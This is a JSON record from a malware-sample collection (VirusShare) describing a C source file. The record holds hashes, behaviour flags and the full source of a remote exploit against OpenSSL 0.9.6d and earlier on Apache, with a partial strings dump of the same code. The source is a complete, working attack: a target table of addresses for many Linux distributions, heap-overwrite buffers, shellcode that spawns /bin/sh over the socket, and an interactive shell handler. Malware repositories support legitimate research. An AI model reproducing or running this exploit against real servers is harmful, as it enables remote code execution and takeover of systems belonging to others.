{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "write": "May write to a file"
        },
        "macro": "/*gcc -o t t.c -lcrypto\n *OpenSSL v0.9.6d and below remote exploit \n */\n#include <stdio.h>\n#include <unistd.h>\n#include <string.h>\n#include <fcntl.h>\n#include <stdlib.h>\n#include <stdarg.h>\n#include <sys/ioctl.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <sys/time.h>\n#include <unistd.h>\n#include <errno.h>\n#include <netdb.h>\n#include <arpa/telnet.h>\n#include <sys/wait.h>\n#include <signal.h>\n\n#include <openssl/ssl.h>\n#include <openssl/rsa.h>\n#include <openssl/x509.h>\n#include <openssl/evp.h>\n\nunsigned long myip=0;\n\nvoid conv(char *str,int len,unsigned long server) {\n\tmemset(str,0,len);\n\tstrcpy(str,(char*)inet_ntoa(*(struct in_addr*)&server));\n}\n\nvoid cleanup(char *buf) {\n\twhile(buf[strlen(buf)-1] == '\\n' || buf[strlen(buf)-1] == '\\r' || buf[strlen(buf)-1] == ' ') buf[strlen(buf)-1] = 0;\n\twhile(*buf == '\\n' || *buf == '\\r' || *buf == ' ') {\n\t\tunsigned long i;\n\t\tfor (i=strlen(buf)+1;i>0;i--) buf[i-1]=buf[i];\n\t}\n}\n\nchar *GetAddress(char *ip) {\n\tstruct sockaddr_in sin;\n\tfd_set fds;\n\tint n,d,sock;\n\tchar buf[1024];\n\tstruct timeval tv;\n\tsock = socket(PF_INET, SOCK_STREAM, 0);\n\tsin.sin_family = PF_INET;\n\tsin.sin_addr.s_addr = inet_addr(ip);\n\tsin.sin_port = htons(80);\n\tif(connect(sock, (struct sockaddr *) & sin, sizeof(sin)) != 0) return NULL;\n\twrite(sock,\"GET / HTTP/1.1\\r\\n\\r\\n\",strlen(\"GET / HTTP/1.1\\r\\n\\r\\n\"));\n\ttv.tv_sec = 15;\n\ttv.tv_usec = 0;\n\tFD_ZERO(&fds);\n\tFD_SET(sock, &fds);\n\tmemset(buf, 0, sizeof(buf));\n\tif(select(sock + 1, &fds, NULL, NULL, &tv) > 0) {\n\t\tif(FD_ISSET(sock, &fds)) {\n\t\t\tif((n = read(sock, buf, sizeof(buf) - 1)) < 0) return NULL;\n\t\t\tfor (d=0;d<n;d++) if (!strncmp(buf+d,\"Server: \",strlen(\"Server: \"))) {\n\t\t\t\tchar *start=buf+d+strlen(\"Server: \");\n\t\t\t\tfor (d=0;d<strlen(start);d++) if (start[d] == '\\n') start[d]=0;\n\t\t\t\tcleanup(start);\n\t\t\t\treturn strdup(start);\n\t\t\t}\n\t\t}\n\t}\n\treturn NULL;\n}\n\n#define\tENC(c) ((c) ? ((c) & 077) + ' ': '`')\n\nint sendch(int sock,int buf) {\n\tchar a[2];\n\tint b=1;\n\tif (buf == '`' || buf == '\\\\' || buf == '$') {\n\t\ta[0]='\\\\';\n\t\ta[1]=0;\n\t\tb=write(sock,a,1);\n\t}\n\tif (b <= 0) return b;\n\ta[0]=buf;\n\ta[1]=0;\n\treturn write(sock,a,1);\n}\n\nint writem(int sock, char *str) {\n\treturn write(sock,str,strlen(str));\n}\n\n\n#define MAX_ARCH 21\n\nstruct archs {\n\tchar *os;\n\tchar *apache;\n\tint func_addr;\n} architectures[] = {\n\t{\"Gentoo\", \"1.3.24-r2\", 0x08086c34},\n\t{\"Debian Woody GNU/Linux 3.0\", \"1.3.26\", 0x080863cc},\n\t{\"Red-Hat 6.0\", \"1.3.6\", 0x080707ec},\n\t{\"Red-Hat 6.1\", \"1.3.9\", 0x0808ccc4},\n\t{\"Red-Hat 6.2\", \"1.3.12\", 0x0808f614},\n\t{\"Red-Hat 7.0\", \"1.3.12\", 0x0809251c},\n\t{\"Red-Hat 7.1\", \"1.3.19\", 0x0809af8c},\n\t{\"Red-Hat 7.2\", \"1.3.20\", 0x080994d4},\n\t{\"Redhat Linux 7.2 (apache-1.3.26 w/PHP)\", \"1.3.26\", 0x08269988},\n\t{\"Red-Hat 7.3\", \"1.3.26\", 0x08161c14},\n\t{\"Red-Hat 7.3\", \"1.3.23\", 0x0808528c},\n\t{\"Red-Hat\", \"1.3.22\", 0x0808400c},\n\t{\"SuSE Linux 7.0\", \"1.3.12\", 0x0809f54c},\n\t{\"SuSE Linux 7.1\", \"1.3.17\", 0x08099984},\n\t{\"SuSE Linux 7.2\", \"1.3.19\", 0x08099ec8},\n\t{\"SuSE Linux 7.3\", \"1.3.20\", 0x08099da8},\n\t{\"SuSE Linux 8.0\", \"1.3.23\", 0x08086168},\n\t{\"SuSE Linux 8.0#\", \"1.3.23\", 0x080861c8},\n\t{\"Mandrake Linux 7.1\", \"1.3.14\", 0x0809d6c4},\n\t{\"Mandrake Linux 8.0\", \"1.3.19\", 0x0809ea98},\n\t{\"Mandrake Linux 8.1\", \"1.3.20\", 0x0809e97c},\n\t{\"Mandrake Linux 8.2\", \"1.3.23\", 0x08086580},\n\t{\"Slackware 7.0\", \"1.3.26\", 0x083d37fc},\n\t{\"Slackware 8.1-stable\", \"1.3.26\",0x080b2100},\n    {NULL, NULL,0},\n};\n\nextern int errno;\n\nint cipher;\nint ciphers;\n\n#define FINDSCKPORTOFS\t   208 + 12 + 46\n\nunsigned char overwrite_session_id_length[] =\n\t\"AAAA\"\n\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n\t\"\\x70\\x00\\x00\\x00\";\n\nunsigned char overwrite_next_chunk[] =\n\t\"AAAA\"\n\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n\t\"AAAA\"\n\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n\t\"AAAA\"\n\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n\t\"AAAA\"\n\t\"\\x00\\x00\\x00\\x00\"\n\t\"\\x00\\x00\\x00\\x00\"\n\t\"AAAA\"\n\t\"\\x01\\x00\\x00\\x00\"\n\t\"AAAA\"\n\t\"AAAA\"\n\t\"AAAA\"\n\t\"\\x00\\x00\\x00\\x00\"\n\t\"AAAA\"\n\t\"\\x00\\x00\\x00\\x00\"\n\t\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n\t\"AAAAAAAA\"\n\n\t\"\\x00\\x00\\x00\\x00\"\n\t\"\\x11\\x00\\x00\\x00\"\n\t\"fdfd\"\n\t\"bkbk\"\n\t\"\\x10\\x00\\x00\\x00\"\n\t\"\\x10\\x00\\x00\\x00\"\n\n\t\"\\xeb\\x0a\\x90\\x90\"\n\t\"\\x90\\x90\\x90\\x90\"\n\t\"\\x90\\x90\\x90\\x90\"\n\n\t\"\\x31\\xdb\"\n\t\"\\x89\\xe7\"\n\t\"\\x8d\\x77\\x10\"\n\t\"\\x89\\x77\\x04\"\n\t\"\\x8d\\x4f\\x20\"\n\t\"\\x89\\x4f\\x08\"\n\t\"\\xb3\\x10\"\n\t\"\\x89\\x19\"\n\t\"\\x31\\xc9\"\n\t\"\\xb1\\xff\"\n\t\"\\x89\\x0f\"\n\t\"\\x51\"\n\t\"\\x31\\xc0\"\n\t\"\\xb0\\x66\"\n\t\"\\xb3\\x07\"\n\t\"\\x89\\xf9\"\n\t\"\\xcd\\x80\"\n\t\"\\x59\"\n\t\"\\x31\\xdb\"\n\t\"\\x39\\xd8\"\n\t\"\\x75\\x0a\"\n\t\"\\x66\\xb8\\x12\\x34\"\n\t\"\\x66\\x39\\x46\\x02\"\n\t\"\\x74\\x02\"\n\t\"\\xe2\\xe0\"\n\t\"\\x89\\xcb\"\n\t\"\\x31\\xc9\"\n\t\"\\xb1\\x03\"\n\t\"\\x31\\xc0\"\n\t\"\\xb0\\x3f\"\n\t\"\\x49\"\n\t\"\\xcd\\x80\"\n\t\"\\x41\"\n\t\"\\xe2\\xf6\"\n\n\t\"\\x31\\xc9\"\n\t\"\\xf7\\xe1\"\n\t\"\\x51\"\n\t\"\\x5b\"\n\t\"\\xb0\\xa4\"\n\t\"\\xcd\\x80\"\n\n\t\"\\x31\\xc0\"\n\t\"\\x50\"\n\t\"\\x68\"\"//sh\"\n\t\"\\x68\"\"/bin\"\n\t\"\\x89\\xe3\"\n\t\"\\x50\"\n\t\"\\x53\"\n\t\"\\x89\\xe1\"\n\t\"\\x99\"\n\t\"\\xb0\\x0b\"\n\t\"\\xcd\\x80\";\n\n#define BUFSIZE 16384\n#define CHALLENGE_LENGTH 16\n#define RC4_KEY_LENGTH 16\n#define RC4_KEY_MATERIAL_LENGTH (RC4_KEY_LENGTH*2)\n#define n2s(c,s)\t((s=(((unsigned int)(c[0]))<< 8)| (((unsigned int)(c[1]))\t )),c+=2)\n#define s2n(s,c)\t((c[0]=(unsigned char)(((s)>> 8)&0xff), c[1]=(unsigned char)(((s)\t )&0xff)),c+=2)\n\ntypedef struct {\n\tint sock;\n\tunsigned char challenge[CHALLENGE_LENGTH];\n\tunsigned char master_key[RC4_KEY_LENGTH];\n\tunsigned char key_material[RC4_KEY_MATERIAL_LENGTH];\n\tint conn_id_length;\n\tunsigned char conn_id[SSL2_MAX_CONNECTION_ID_LENGTH];\n\tX509 *x509;\n\tunsigned char* read_key;\n\tunsigned char* write_key;\n\tRC4_KEY* rc4_read_key;\n\tRC4_KEY* rc4_write_key;\n\tint read_seq;\n\tint write_seq;\n\tint encrypted;\n} ssl_conn;\n\nlong getip(char *hostname) {\n\tstruct hostent *he;\n\tlong ipaddr;\n\tif ((ipaddr = inet_addr(hostname)) < 0) {\n\t\tif ((he = gethostbyname(hostname)) == NULL) exit(-1);\n\t\tmemcpy(&ipaddr, he->h_addr, he->h_length);\n\t}\t\n\treturn ipaddr;\n}\n\nint sh(int sock) {\n\tchar localip[256], rcv[1024];\n\tfd_set rset;\n\tint maxfd, n;\n\n       sleep(2);\n       write(sock, \"uname -a;id\\n\", strlen(\"uname -a;id\\n\"));\n       while (1) {\n\t\t\tfd_set          fds;\n\t\t\tint             n;\n\t\t\tstruct timeval  tv;\n\t\t\tchar buf[1024];\n\t\t\t\n\t\t\ttv.tv_sec = 5;\n\t\t\ttv.tv_usec = 0;\n\n\t\t\tFD_ZERO(&fds);\n\t\t\tFD_SET(0, &fds);\n\t\t\tFD_SET(sock, &fds);\n\n\t\t\tmemset(buf, 0, sizeof(buf));\n\t\t\tif(select(sock + 1, &fds, NULL, NULL, &tv) > 0) {\n\t\t\t\tif(FD_ISSET(sock, &fds)) {\n\t\t\t\t\tif((n = read(sock, buf, sizeof(buf) - 1)) <= 0)\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\twrite(1, buf, n);\n\t\t\t\t}\n\n\t\t\t\tif(FD_ISSET(0, &fds)) {\n\t\t\t\t\tif((n = read(0, buf, sizeof(buf) - 1)) < 0)\n\t\t\t\t\t\texit(1);\n\n\t\t\t\t\twrite(sock, buf, n);\n\t\t\t\t}\n\t\t\t}//end select\n\t\t}//end while\n\n}\n\nint get_local_port(int sock) {\n\tstruct sockaddr_in s_in;\n\tunsigned int namelen = sizeof(s_in);\n\tif (getsockname(sock, (struct sockaddr *)&s_in, &namelen) < 0) exit(1);\n\treturn s_in.sin_port;\n}\n\nint connect_host(char* host, int port) {\n\tstruct sockaddr_in s_in;\n\tint sock;\n\ts_in.sin_family = AF_INET;\n\ts_in.sin_addr.s_addr = getip(host);\n\ts_in.sin_port = htons(port);\n\tif ((sock = socket(AF_INET, SOCK_STREAM, 0)) <= 0) exit(1);\n\talarm(10);\n\tif (connect(sock, (struct sockaddr *)&s_in, sizeof(s_in)) < 0) exit(1);\n\talarm(0);\n\treturn sock;\n}\n\nssl_conn* ssl_connect_host(char* host, int port) {\n\tssl_conn* ssl;\n\tif (!(ssl = (ssl_conn*) malloc(sizeof(ssl_conn)))) exit(1);\n\tssl->encrypted = 0;\n\tssl->write_seq = 0;\n\tssl->read_seq = 0;\n\tssl->sock = connect_host(host, port);\n\treturn ssl;\n}\n\nchar res_buf[30];\n\nint read_data(int sock, unsigned char* buf, int len) {\n\tint l;\n\tint to_read = len;\n\tdo {\n\t\tif ((l = read(sock, buf, to_read)) < 0) exit(1);\n\t\tto_read -= len;\n\t} while (to_read > 0);\n\treturn len;\n}\n\nint read_ssl_packet(ssl_conn* ssl, unsigned char* buf, int buf_size) {\n\tint rec_len, padding;\n\tread_data(ssl->sock, buf, 2);\n\tif ((buf[0] & 0x80) == 0) {\n\t\trec_len = ((buf[0] & 0x3f) << 8) | buf[1];\n\t\tread_data(ssl->sock, &buf[2], 1);\n\t\tpadding = (int)buf[2];\n\t}\n\telse {\n\t\trec_len = ((buf[0] & 0x7f) << 8) | buf[1];\n\t\tpadding = 0;\n\t}\n\tif ((rec_len <= 0) || (rec_len > buf_size)) exit(1);\n\tread_data(ssl->sock, buf, rec_len);\n\tif (ssl->encrypted) {\n\t\tif (MD5_DIGEST_LENGTH + padding >= rec_len) {\n\t\t\tif ((buf[0] == SSL2_MT_ERROR) && (rec_len == 3)) return 0;\n\t\t\telse exit(1);\n\t\t}\n\t\tRC4(ssl->rc4_read_key, rec_len, buf, buf);\n\t\trec_len = rec_len - MD5_DIGEST_LENGTH - padding;\n\t\tmemmove(buf, buf + MD5_DIGEST_LENGTH, rec_len);\n\t}\n\tif (buf[0] == SSL2_MT_ERROR) {\n\t\tif (rec_len != 3) exit(1);\n\t\telse return 0;\n\t}\n\treturn rec_len;\n}\n\nvoid send_ssl_packet(ssl_conn* ssl, unsigned char* rec, int rec_len) {\n\tunsigned char buf[BUFSIZE];\n\tunsigned char* p;\n\tint tot_len;\n\tMD5_CTX ctx;\n\tint seq;\n\tif (ssl->encrypted) tot_len = rec_len + MD5_DIGEST_LENGTH;\n\telse tot_len = rec_len;\n\n\tif (2 + tot_len > BUFSIZE) exit(1);\n\n\tp = buf;\n\ts2n(tot_len, p);\n\n\tbuf[0] = buf[0] | 0x80;\n\n\tif (ssl->encrypted) {\n\t\tseq = ntohl(ssl->write_seq);\n\n\t\tMD5_Init(&ctx);\n\t\tMD5_Update(&ctx, ssl->write_key, RC4_KEY_LENGTH);\n\t\tMD5_Update(&ctx, rec, rec_len);\n\t\tMD5_Update(&ctx, &seq, 4);\n\t\tMD5_Final(p, &ctx);\n\n\t\tp+=MD5_DIGEST_LENGTH;\n\n\t\tmemcpy(p, rec, rec_len);\n\n\t\tRC4(ssl->rc4_write_key, tot_len, &buf[2], &buf[2]);\n\t}\n\telse memcpy(p, rec, rec_len);\n\n\tsend(ssl->sock, buf, 2 + tot_len, 0);\n\n\tssl->write_seq++;\n}\n\nvoid send_client_hello(ssl_conn *ssl) {\n\tint i;\n\tunsigned char buf[BUFSIZE] =\n\t\t\"\\x01\"\n\t\t\"\\x00\\x02\"\n\t\t\"\\x00\\x18\"\n\t\t\"\\x00\\x00\"\n\t\t\"\\x00\\x10\"\n\t\t\"\\x07\\x00\\xc0\\x05\\x00\\x80\\x03\\x00\"\n\t\t\"\\x80\\x01\\x00\\x80\\x08\\x00\\x80\\x06\"\n\t\t\"\\x00\\x40\\x04\\x00\\x80\\x02\\x00\\x80\"\n\t\t\"\";\n\tfor (i = 0; i < CHALLENGE_LENGTH; i++) ssl->challenge[i] = (unsigned char) (rand() >> 24);\n\tmemcpy(&buf[33], ssl->challenge, CHALLENGE_LENGTH);\n\tsend_ssl_packet(ssl, buf, 33 + CHALLENGE_LENGTH);\n}\n\nvoid get_server_hello(ssl_conn* ssl) {\n\tunsigned char buf[BUFSIZE];\n\tunsigned char *p, *end;\n\tint len;\n\tint server_version, cert_length, cs_length, conn_id_length;\n\tint found;\n\n\tif (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) exit(1);\n\tif (len < 11) exit(1);\n\n\tp = buf;\n\n\tif (*(p++) != SSL2_MT_SERVER_HELLO) exit(1);\n\tif (*(p++) != 0) exit(1);\n\tif (*(p++) != 1) exit(1);\n\tn2s(p, server_version);\n\tif (server_version != 2) exit(1);\n\n\tn2s(p, cert_length);\n\tn2s(p, cs_length);\n\tn2s(p, conn_id_length);\n\n\tif (len != 11 + cert_length + cs_length + conn_id_length) exit(1);\n\tssl->x509 = NULL;\n\tssl->x509=d2i_X509(NULL,&p,(long)cert_length);\n\tif (ssl->x509 == NULL) exit(1);\n\tif (cs_length % 3 != 0) exit(1);\n\n\tfound = 0;\n\tfor (end=p+cs_length; p < end; p += 3) if ((p[0] == 0x01) && (p[1] == 0x00) && (p[2] == 0x80)) found = 1;\n\n\tif (!found) exit(1);\n\n\tif (conn_id_length > SSL2_MAX_CONNECTION_ID_LENGTH) exit(1);\n\n\tssl->conn_id_length = conn_id_length;\n\tmemcpy(ssl->conn_id, p, conn_id_length);\n}\n\nvoid send_client_master_key(ssl_conn* ssl, unsigned char* key_arg_overwrite, int key_arg_overwrite_len) {\n\tint encrypted_key_length, key_arg_length, record_length;\n\tunsigned char* p;\n\tint i;\n\tEVP_PKEY *pkey=NULL;\n\tunsigned char buf[BUFSIZE] =\n\t\t\"\\x02\"\n\t\t\"\\x01\\x00\\x80\"\n\t\t\"\\x00\\x00\"\n\t\t\"\\x00\\x40\"\n\t\t\"\\x00\\x08\";\n\tp = &buf[10];\n\tfor (i = 0; i < RC4_KEY_LENGTH; i++) ssl->master_key[i] = (unsigned char) (rand() >> 24);\n\tpkey=X509_get_pubkey(ssl->x509);\n\tif (!pkey) exit(1);\n\tif (pkey->type != EVP_PKEY_RSA) exit(1);\n\tencrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], pkey->pkey.rsa, RSA_PKCS1_PADDING);\n\tif (encrypted_key_length <= 0) exit(1);\n\tp += encrypted_key_length;\n\tif (key_arg_overwrite) {\n\t\tfor (i = 0; i < 8; i++) *(p++) = (unsigned char) (rand() >> 24);\n\t\tmemcpy(p, key_arg_overwrite, key_arg_overwrite_len);\n\t\tkey_arg_length = 8 + key_arg_overwrite_len;\n\t}\n\telse key_arg_length = 0;\n\tp = &buf[6];\n\ts2n(encrypted_key_length, p);\n\ts2n(key_arg_length, p);\n\trecord_length = 10 + encrypted_key_length + key_arg_length;\n\tsend_ssl_packet(ssl, buf, record_length);\n\tssl->encrypted = 1;\n}\n\nvoid generate_key_material(ssl_conn* ssl) {\n\tunsigned int i;\n\tMD5_CTX ctx;\n\tunsigned char *km;\n\tunsigned char c='0';\n\tkm=ssl->key_material;\n\tfor (i=0; i<RC4_KEY_MATERIAL_LENGTH; i+=MD5_DIGEST_LENGTH) {\n\t\tMD5_Init(&ctx);\n\t\tMD5_Update(&ctx,ssl->master_key,RC4_KEY_LENGTH);\n\t\tMD5_Update(&ctx,&c,1);\n\t\tc++;\n\t\tMD5_Update(&ctx,ssl->challenge,CHALLENGE_LENGTH);\n\t\tMD5_Update(&ctx,ssl->conn_id, ssl->conn_id_length);\n\t\tMD5_Final(km,&ctx);\n\t\tkm+=MD5_DIGEST_LENGTH;\n\t}\n}\n\nvoid generate_session_keys(ssl_conn* ssl) {\n\tgenerate_key_material(ssl);\n\tssl->read_key = &(ssl->key_material[0]);\n\tssl->rc4_read_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));\n\tRC4_set_key(ssl->rc4_read_key, RC4_KEY_LENGTH, ssl->read_key);\n\tssl->write_key = &(ssl->key_material[RC4_KEY_LENGTH]);\n\tssl->rc4_write_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));\n\tRC4_set_key(ssl->rc4_write_key, RC4_KEY_LENGTH, ssl->write_key);\n}\n\nvoid get_server_verify(ssl_conn* ssl) {\n\tunsigned char buf[BUFSIZE];\n\tint len;\n\tif (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) exit(1);\n\tif (len != 1 + CHALLENGE_LENGTH) exit(1);\n\tif (buf[0] != SSL2_MT_SERVER_VERIFY) exit(1);\n\tif (memcmp(ssl->challenge, &buf[1], CHALLENGE_LENGTH)) exit(1);\n}\n\nvoid send_client_finished(ssl_conn* ssl) {\n\tunsigned char buf[BUFSIZE];\n\tbuf[0] = SSL2_MT_CLIENT_FINISHED;\n\tmemcpy(&buf[1], ssl->conn_id, ssl->conn_id_length);\n\tsend_ssl_packet(ssl, buf, 1+ssl->conn_id_length);\n}\n\nvoid get_server_finished(ssl_conn* ssl) {\n\tunsigned char buf[BUFSIZE];\n\tint len;\n\tint i;\n\tif (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) exit(1);\n\tif (buf[0] != SSL2_MT_SERVER_FINISHED) exit(1);\n\tif (len <= 112) exit(1);\n\tcipher = *(int*)&buf[101];\n\tciphers = *(int*)&buf[109];\n}\n\nvoid get_server_error(ssl_conn* ssl) {\n\tunsigned char buf[BUFSIZE];\n\tint len;\n\tif ((len = read_ssl_packet(ssl, buf, sizeof(buf))) > 0) exit(1);\n}\n\nvoid exploit(int os,char *ip,int port) {\n\tint i;\n\tint arch=-1;\n\tint N = 20;\n\tssl_conn* ssl1;\n\tssl_conn* ssl2;\n\tchar *a;\n\n\talarm(3600);\n\t\n\tarch  = os ;\n\tif (os ==-1)\n\t{\n\t\tif ((a=GetAddress(ip)) == NULL) exit(0);\n\t\tif (strncmp(a,\"Apache\",6)) exit(0);\n\t\tfor (i=0;architectures[i].os!=NULL;i++) {\n\t\t\tif (strstr(a,architectures[i].apache) && strstr(a,architectures[i].os)) {\n\t\t\t\tarch=i;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (arch == -1) arch=10;\n\t}\n\t\n\t\n\tsrand(0x31337);\n\t\n\t\n\tfor (i=0; i<N; i++) {\n\t\tconnect_host(ip, port);\n\t\tusleep(100000);\n\t}\n\t\n\n\tssl1 = ssl_connect_host(ip, port);\n\tssl2 = ssl_connect_host(ip, port);\n\n\tsend_client_hello(ssl1);\n\tget_server_hello(ssl1);\n\tsend_client_master_key(ssl1, overwrite_session_id_length, sizeof(overwrite_session_id_length)-1);\n\tgenerate_session_keys(ssl1);\n\tget_server_verify(ssl1);\n\tsend_client_finished(ssl1);\n\tget_server_finished(ssl1);\n\n\tport = get_local_port(ssl2->sock);\n\toverwrite_next_chunk[FINDSCKPORTOFS] = (char) (port & 0xff);\n\toverwrite_next_chunk[FINDSCKPORTOFS+1] = (char) ((port >> 8) & 0xff);\n\n\t*(int*)&overwrite_next_chunk[156] = cipher;\n\t*(int*)&overwrite_next_chunk[192] = architectures[arch].func_addr - 12;\n\t*(int*)&overwrite_next_chunk[196] = ciphers + 16;\n\n\tsend_client_hello(ssl2);\n\tget_server_hello(ssl2);\n\n\tsend_client_master_key(ssl2, overwrite_next_chunk, sizeof(overwrite_next_chunk)-1);\n\tgenerate_session_keys(ssl2);\n\tget_server_verify(ssl2);\n\n\tfor (i = 0; i < ssl2->conn_id_length; i++) ssl2->conn_id[i] = (unsigned char) (rand() >> 24);\n\n\tsend_client_finished(ssl2);\n\tget_server_error(ssl2);\n\n\tsh(ssl2->sock);\n\n\tclose(ssl2->sock);\n\tclose(ssl1->sock);\n\n\texit(0);\n}\n\nint main(int argc, char * argv[])\n{\n\tint port = 443;\n    int os,i;\n\n\tif (argc < 3)\n\t{\n\tprintf(\"APACHE + OPENSSL EXPLOIT\\n\\n\");\n\tfor (i=0;architectures[i].os!=NULL;i++) \n\t\tprintf(\"target %d  %s %s %p\\n\",i,architectures[i].os,architectures[i].apache,architectures[i].func_addr);\n\t\t\n\tprintf(\"\\n\");\n\tprintf(\"usage:%s target hostip [port]\\n\",argv[0]);\n\tprintf(\"usage:%s auto hostip [port] to auto select target\\n\",argv[0]);\n\texit(0);\n\t}\n\tif (argc >3 )\n\t{\n\t\tport = atoi(argv[3]);\n\t}\n\t\n\tif (strcmp(\"auto\",argv[1])==0)\n\t\tos = -1;\n\telse os =atoi(argv[1]);\n\n\texploit(os,argv[2],port);\n\treturn 0;\n}"
    },
    "filename": "VirusShare_3bcfe74eeaecc523138fde64e2f75713",
    "filesize": 15657,
    "filetype": "C source, ASCII text",
    "hashes": {
        "md5": "3bcfe74eeaecc523138fde64e2f75713",
        "sha1": "74a5fec63281b5bed152e10784d1bc9c4e1699aa",
        "sha256": "b2daa47a109628f220560c2106c6fd7aab975403f453bbf4c4d2c2a413f90834"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "/*gcc -o t t.c -lcrypto",
            " *OpenSSL v0.9.6d and below remote exploit ",
            "#include <stdio.h>",
            "#include <unistd.h>",
            "#include <string.h>",
            "#include <fcntl.h>",
            "#include <stdlib.h>",
            "#include <stdarg.h>",
            "#include <sys/ioctl.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "#include <sys/time.h>",
            "#include <unistd.h>",
            "#include <errno.h>",
            "#include <netdb.h>",
            "#include <arpa/telnet.h>",
            "#include <sys/wait.h>",
            "#include <signal.h>",
            "#include <openssl/ssl.h>",
            "#include <openssl/rsa.h>",
            "#include <openssl/x509.h>",
            "#include <openssl/evp.h>",
            "unsigned long myip=0;",
            "void conv(char *str,int len,unsigned long server) {",
            "\tmemset(str,0,len);",
            "\tstrcpy(str,(char*)inet_ntoa(*(struct in_addr*)&server));",
            "void cleanup(char *buf) {",
            "\twhile(buf[strlen(buf)-1] == '\\n' || buf[strlen(buf)-1] == '\\r' || buf[strlen(buf)-1] == ' ') buf[strlen(buf)-1] = 0;",
            "\twhile(*buf == '\\n' || *buf == '\\r' || *buf == ' ') {",
            "\t\tunsigned long i;",
            "\t\tfor (i=strlen(buf)+1;i>0;i--) buf[i-1]=buf[i];",
            "char *GetAddress(char *ip) {",
            "\tstruct sockaddr_in sin;",
            "\tfd_set fds;",
            "\tint n,d,sock;",
            "\tchar buf[1024];",
            "\tstruct timeval tv;",
            "\tsock = socket(PF_INET, SOCK_STREAM, 0);",
            "\tsin.sin_family = PF_INET;",
            "\tsin.sin_addr.s_addr = inet_addr(ip);",
            "\tsin.sin_port = htons(80);",
            "\tif(connect(sock, (struct sockaddr *) & sin, sizeof(sin)) != 0) return NULL;",
            "\twrite(sock,\"GET / HTTP/1.1\\r\\n\\r\\n\",strlen(\"GET / HTTP/1.1\\r\\n\\r\\n\"));",
            "\ttv.tv_sec = 15;",
            "\ttv.tv_usec = 0;",
            "\tFD_ZERO(&fds);",
            "\tFD_SET(sock, &fds);",
            "\tmemset(buf, 0, sizeof(buf));",
            "\tif(select(sock + 1, &fds, NULL, NULL, &tv) > 0) {",
            "\t\tif(FD_ISSET(sock, &fds)) {",
            "\t\t\tif((n = read(sock, buf, sizeof(buf) - 1)) < 0) return NULL;",
            "\t\t\tfor (d=0;d<n;d++) if (!strncmp(buf+d,\"Server: \",strlen(\"Server: \"))) {",
            "\t\t\t\tchar *start=buf+d+strlen(\"Server: \");",
            "\t\t\t\tfor (d=0;d<strlen(start);d++) if (start[d] == '\\n') start[d]=0;",
            "\t\t\t\tcleanup(start);",
            "\t\t\t\treturn strdup(start);",
            "\t\t\t}",
            "\treturn NULL;",
            "#define\tENC(c) ((c) ? ((c) & 077) + ' ': '`')",
            "int sendch(int sock,int buf) {",
            "\tchar a[2];",
            "\tint b=1;",
            "\tif (buf == '`' || buf == '\\\\' || buf == '$') {",
            "\t\ta[0]='\\\\';",
            "\t\ta[1]=0;",
            "\t\tb=write(sock,a,1);",
            "\tif (b <= 0) return b;",
            "\ta[0]=buf;",
            "\ta[1]=0;",
            "\treturn write(sock,a,1);",
            "int writem(int sock, char *str) {",
            "\treturn write(sock,str,strlen(str));",
            "#define MAX_ARCH 21",
            "struct archs {",
            "\tchar *os;",
            "\tchar *apache;",
            "\tint func_addr;",
            "} architectures[] = {",
            "\t{\"Gentoo\", \"1.3.24-r2\", 0x08086c34},",
            "\t{\"Debian Woody GNU/Linux 3.0\", \"1.3.26\", 0x080863cc},",
            "\t{\"Red-Hat 6.0\", \"1.3.6\", 0x080707ec},",
            "\t{\"Red-Hat 6.1\", \"1.3.9\", 0x0808ccc4},",
            "\t{\"Red-Hat 6.2\", \"1.3.12\", 0x0808f614},",
            "\t{\"Red-Hat 7.0\", \"1.3.12\", 0x0809251c},",
            "\t{\"Red-Hat 7.1\", \"1.3.19\", 0x0809af8c},",
            "\t{\"Red-Hat 7.2\", \"1.3.20\", 0x080994d4},",
            "\t{\"Redhat Linux 7.2 (apache-1.3.26 w/PHP)\", \"1.3.26\", 0x08269988},",
            "\t{\"Red-Hat 7.3\", \"1.3.26\", 0x08161c14},",
            "\t{\"Red-Hat 7.3\", \"1.3.23\", 0x0808528c},",
            "\t{\"Red-Hat\", \"1.3.22\", 0x0808400c},",
            "\t{\"SuSE Linux 7.0\", \"1.3.12\", 0x0809f54c},",
            "\t{\"SuSE Linux 7.1\", \"1.3.17\", 0x08099984},",
            "\t{\"SuSE Linux 7.2\", \"1.3.19\", 0x08099ec8},",
            "\t{\"SuSE Linux 7.3\", \"1.3.20\", 0x08099da8},",
            "\t{\"SuSE Linux 8.0\", \"1.3.23\", 0x08086168},",
            "\t{\"SuSE Linux 8.0#\", \"1.3.23\", 0x080861c8},",
            "\t{\"Mandrake Linux 7.1\", \"1.3.14\", 0x0809d6c4},",
            "\t{\"Mandrake Linux 8.0\", \"1.3.19\", 0x0809ea98},",
            "\t{\"Mandrake Linux 8.1\", \"1.3.20\", 0x0809e97c},",
            "\t{\"Mandrake Linux 8.2\", \"1.3.23\", 0x08086580},",
            "\t{\"Slackware 7.0\", \"1.3.26\", 0x083d37fc},",
            "\t{\"Slackware 8.1-stable\", \"1.3.26\",0x080b2100},",
            "    {NULL, NULL,0},",
            "extern int errno;",
            "int cipher;",
            "int ciphers;",
            "#define FINDSCKPORTOFS\t   208 + 12 + 46",
